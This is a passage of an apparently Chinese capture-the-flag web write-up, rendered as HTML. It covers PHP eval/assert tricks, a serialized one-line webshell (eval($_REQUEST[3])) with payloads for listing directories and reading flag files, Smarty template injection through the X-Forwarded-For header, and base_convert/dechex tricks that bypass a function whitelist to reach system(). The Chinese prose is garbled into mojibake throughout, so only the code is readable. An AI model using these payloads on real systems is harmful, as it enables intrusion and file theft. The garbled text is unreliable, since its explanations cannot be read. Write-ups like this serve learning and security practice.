class="hljs-comment">//phpinfo()è¢«æ‰§è¡Œ</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);  <span class="hljs-comment">//phpinfo()ä¸è¢«æ‰§è¡Œ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);    <span class="hljs-comment">//whoamiå‘½ä»¤è¢«æ‰§è¡Œ</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);      <span class="hljs-comment">//whoamiå‘½ä»¤ä¸è¢«æ‰§è¡Œ</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(whoami);&quot;</span>); <span class="hljs-comment">//æ‰§è¡ŒæˆåŠŸï¼Œæ³¨æ„å’Œä¸Šä¸€æ¡çš„åŒºåˆ«</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠsystemå’Œevalç»„åˆä½¿ç”¨</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<span class="hljs-comment">// &quot;system(&#x27;whoami&#x27;);&quot;; ä¹Ÿè¡Œï¼Œä½†æ³¨æ„åé¢çš„åˆ†å·ä¸€å®šä¸èƒ½ä¸¢æ‰</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//å›æ˜¾ viper3\rdj</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿™ä¸ª<code>echo $b($a)</code>ä¹Ÿæœ‰ç‚¹è¯´æ³•ï¼Œè¿™ä¸œè¥¿æœ‰äººå«å®ƒ<code>å˜é‡å‡½æ•°</code>ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;eval(&#x27;phpinfo();&#x27;)&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å›æ˜¾phpinfoçš„å†…å®¹ï¼Œä½†æ˜¯ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//è¿™ä¸œè¥¿æ²¡æœ‰ä»»ä½•ç»“æœ</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//è¿™æ®µä»£ç ä¹Ÿèƒ½phpinfo</span><br></code></pre></td></tr></table></figure><p>å…ˆè¯´ä¸‹è¿™ä¸ª<code>assert</code>å‡½æ•°ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`assert()`å‡½æ•°æ¥å—ä¸€ä¸ªè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ï¼Œå¹¶å¯¹è¯¥è¡¨è¾¾å¼è¿›è¡Œæ±‚å€¼ã€‚å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸï¼Œåˆ™ç»§ç»­æ‰§è¡Œåç»­ä»£ç ï¼›å¦‚æœè¡¨è¾¾å¼ä¸ºå‡ï¼Œåˆ™è§¦å‘ä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼Œç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚ä½†å®ƒä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„çš„PHPä»£ç ï¼ŒåŒ…æ‹¬æ‰§è¡Œå‘½ä»¤ã€‚è¿™æ˜¯å› ä¸º`assert()`å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆä¸èƒ½åªå•çº¯ç”¨ä¸€ä¸ª<code>eval</code>ï¼ŒåŸå› æ˜¯PHPä¸­ä¸èƒ½ä»¥å˜é‡å‡½æ•°çš„å½¢å¼å»è°ƒç”¨å®ƒï¼ševal å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨ã€‚</p><p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;eval($_REQUEST[3]);&#x27;</span>;<span class="hljs-comment">//REQUESTæ–¹æ³•ï¼Œä¼ å®Œäº†ç”¨GETã€POSTã€COOKIEéƒ½è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆç”¨<code>scandir</code>å‡½æ•°çœ‹çœ‹æ ¹ç›®å½•åº•ä¸‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><code>time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=var_dump(scandir(&#39;/&#39;));</code></p><p>æ³¨æ„è¦ç”¨åˆ†å·ç»“å°¾ï¼å¦åˆ™ä¸èƒ½è¢«æ‰§è¡Œï¼ç”¨<code>var_dump</code>çš„åŸå› æ˜¯è¿™å‡½æ•°ä¼šè¿”å›æ•°ç»„</p><p><img src="/img/scandir2.png" alt="scandir2"></p><p>æœ‰ä¸ª<code>FIag_!S_it</code>ï¼Œ<code>system</code>è¢«ç¦äº†æ‰€ä»¥ç”¨ä¸äº†<code>cat</code>ï¼Œå°è¯•<code>file_get_contents</code>ç›´æ¥è¯»ï¼Œä½†æ˜¯å‡çš„<code>flag</code>ï¼š</p><p><code>echo(file_get_contents(&#39;/FIag_!S_it&#39;));</code></p><p>æ³¨æ„è¿™ä¸ª<strong>ä¸èƒ½</strong>å†™æˆï¼š</p><p><code>echo(&quot;file_get_contents(&#39;/FIag_!S_it&#39;)&quot;);</code>ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæ˜¾ç¤º<code>file_get_contents(&#39;/FIag_!S_it&#39;)</code></p><p><img src="/img/scandir5.png" alt="scandir5"></p><p>ç”¨èšå‰‘è¿æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><code>http://1730f221-b91f-4b8b-b19d-8ce0eb0211e5.node4.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A&#123;s%3A1%3A%22a%22%3Bs%3A19%3A%22eval(%24_REQUEST[3])%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B&#125;</code></p><p><img src="/img/scandir4.png" alt="scandir4"></p><p><img src="/img/scandir3.png" alt="scandir3"></p><p>æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œåº”è¯¥æ˜¯æ²¡æƒé™ã€‚</p><p>çœ‹å¸ˆå‚…ä»¬çš„<code>wp</code>éƒ½æ˜¯å»<code>phpinfo()</code>æ‰¾ï¼Œ<code>ctrl+f</code>æœç´¢å°±è¡Œã€‚</p><p><code>payload:time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=phpinfo();</code></p><p>å†è¡¥å……ä¸‹<code>scandir()</code>è¿™ä¸ªå‡½æ•°ï¼š</p><p><code>scandir()</code>å‡½æ•°ä¼šæ¥å—ä¸€ä¸ªç›®å½•è·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«è¯¥ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ã€‚è¿”å›çš„æ•°ç»„ä¸­ï¼Œæ¯ä¸ªå…ƒç´ è¡¨ç¤ºç›®å½•ä¸­çš„ä¸€ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•çš„åç§°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;../WWW&#x27;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/scandir1.png" alt="scandir1"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>è¿›å»å‘ç°æ˜¯ä¸ªå’Œ<code>IP</code>æœ‰å…³çš„é¡µé¢ï¼Œå³ä¸Šè§’æ˜¾ç¤ºäº†æˆ‘ä»¬çš„å…¬ç½‘<code>IP</code>ï¼š</p><p><img src="/img/web11-1.png" alt="web11-1"></p><p>ä¸‹é¢ç”šè‡³æœ‰è¯·æ±‚åŒ…çš„å®Œæ•´ä¿¡æ¯ï¼š</p><p><img src="/img/web11-2.png" alt="web11-2"></p><p>æ—¢ç„¶å®ƒè·å–äº†<code>IP</code>é‚£å¤§æ¦‚ç‡å¯ä»¥æƒ³åˆ°<code>XFF</code>ä¼ªé€ ï¼ŒæŠ“åŒ…è¯•è¯•çœ‹ï¼š</p><p><img src="/img/web11-3.png" alt="web11-3"></p><p>ç¡®å®æ˜¯è¿™æ ·ï¼Œä½†æœ‰ä»€ä¹ˆç”¨ï¼Ÿè¿™é¢˜æ˜æ˜¾ä¸æ˜¯åˆ©ç”¨XFFçš„SQLæ³¨å…¥ï¼Œæƒ³åˆ°ä¹‹å‰åšè¿‡ä¸€é“å¥½åƒå«<code>cookie is so stable</code>çš„é¢˜ï¼Œé€šè¿‡æ¨¡æ¿æ³¨å…¥è§£é¢˜ï¼Œè¯•è¯•çœ‹ï¼š</p><p><code>X-Forwarded-For:&#123;7*7&#125;</code></p><p><img src="/img/web11-5.png"></p><p>è¿˜çœŸæ˜¯ï¼Œè€è§„çŸ©å…ˆåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œå†è¯•è¯•:<code>X-Forwarded-For:a&#123;*comment*&#125;b</code></p><p><img src="/img/wweb11-6.png" alt="wweb11-6"></p><p>åº”è¯¥æ˜¯<code>Smarty</code>æ¨¡æ¿ï¼Œä¸ªäººè®¤ä¸ºè¿™ä¸ªæ¨¡æ¿æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨<code>XFF</code>ç›´æ¥è¾“å…¥ï¼š<code>&#123;system(&#39;ls /&#39;)&#125;</code>å»æ‰¾<code>flag</code>ï¼Œç„¶åç›´æ¥<code>cat</code>è¯»å°±è¡Œäº†ã€‚</p><p>å…¶å®è¿™é¢˜åº•ä¸‹æœ‰è¡Œå°å­—æç¤ºäº†ï¼š<code>Build With Smarty !</code></p><p><img src="/img/smarty1.png" alt="smarty1"></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>çœ‹é¢˜ç›®å¯èƒ½è·Ÿ<code>MD5</code>æœ‰å…³ï¼Ÿ</p><p>ç›´æ¥ç»™äº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123; <span class="hljs-comment">//GETä¼ å‚ï¼Œcä¸è¢«å®šä¹‰å°±é«˜äº®æºç </span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//åé¢ä¸¤ä¸ªä¾é \æ¥è½¬ä¹‰</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ²¡è§£å‡ºæ¥ï¼Œå› ä¸ºä¸€ç›´åœ¨æƒ³æ€ä¹ˆå»ç»•è¿‡é»‘åå•å’Œæ­£åˆ™åŒ¹é…å»æ‰§è¡Œå‘½ä»¤ï¼Œåé¢çœ‹äº†<code>wp</code>æ‰çŸ¥é“è¦åˆ©ç”¨ç»™çš„å‡½æ•°å»åšï¼Œå‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« <code>https://www.cnblogs.com/20175211lyz/p/11588219.html</code></p><p><code>https://www.anquanke.com/post/id/220813#h3-2</code></p><h4 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h4><p>ä¸»è¦æ˜¯<code>base_convert()</code>å‡½æ•°å’Œ<code>dechex</code>å‡½æ•°çš„ä½¿ç”¨ï¼š</p><p><img src="/img/baseconvert.png" alt="baseconvert"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿çš„èŒƒå›´æ˜¯<code>2-36</code>ï¼Œæ­£å¥½è¦†ç›–äº†<code>0-9,a-z</code>ã€‚<code>dechex</code>å‡½æ•°ç”¨äºå°†åè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚å®ƒæ¥å—ä¸€ä¸ªåè¿›åˆ¶æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¡¨ç¤ºç›¸åº”åå…­è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²ã€‚</p><p>å…ˆçœ‹<code>wp</code>æ€ä¹ˆå†™çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span><br></code></pre></td></tr></table></figure><p><code>payload</code>ï¼š</p><p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=&lt;command&gt;</code></p><p>å› ä¸ºå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼šå…ˆåˆ©ç”¨<code>base_convert</code>å‡½æ•°è½¬å‡ºä¸€ä¸ª<code>hex2bin</code>ï¼Œå†åˆ©ç”¨<code>dechex</code>è½¬å‡ºä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå‰å‡½åå‚ç»„åˆè½¬å‡º<code>_GET</code>.</p><p><code>base_convert</code>é‡åˆ°<code>36</code>è¿›åˆ¶æ—¶ä¼šè½¬æ¢æˆå°å†™å­—æ¯ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼ša</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(A,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š10ï¼Œè½¬å›å»å¹¶ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</span><br></code></pre></td></tr></table></figure><p>åé¢å°±å¾ˆå¥½ç†è§£äº†ï¼Œå®ƒä¼šç›´æ¥<code>eval</code>è¿‡æ»¤åçš„<code>c</code>ã€‚æ‰§è¡Œå<code>c</code>&#x3D;<code>$pi</code>&#x3D;<code>_GET</code>ï¼Œ<code>$$pi</code>&#x3D;<code>$_GET</code>ã€‚å†åˆ©ç”¨$_GET{0}($_GET{1})å»æ‰§è¡Œå‡½æ•°å°±å¥½ã€‚å³ä½¿<code>[]</code>è¢«è¿‡æ»¤äº†ä»å¯ä»¥ä½¿ç”¨<code>&#123;&#125;</code>ç»•è¿‡ã€‚æ„é€ å®Œ<code>_GET</code>åè¿˜éœ€è¦å¼•å…¥ä¸€ä¸ªå˜é‡æ¥ä½œä¸ºå‡½æ•°æ‰§è¡Œ, ä¾‹å¦‚ <code>$a()</code>, æˆ‘ä»¬ç”¨ <code>$pi</code> ä»¥ç»•è¿‡ç™½åå•çš„æ£€æµ‹ã€‚</p><h4 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h4><p>åˆ©ç”¨<code>getallheaders</code>å»è§£é¢˜ï¼š</p><p><code>payload:/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code>æ³¨æ„è¿™ä¸ª<code>getallheadersçš„ç”¨æ³•</code></p><p>é¦–å…ˆä¸ºä»€ä¹ˆæ˜¯30è¿›åˆ¶(å‚è€ƒäº†<code>bfengj</code>å¸ˆå‚…çš„æ–‡ç« 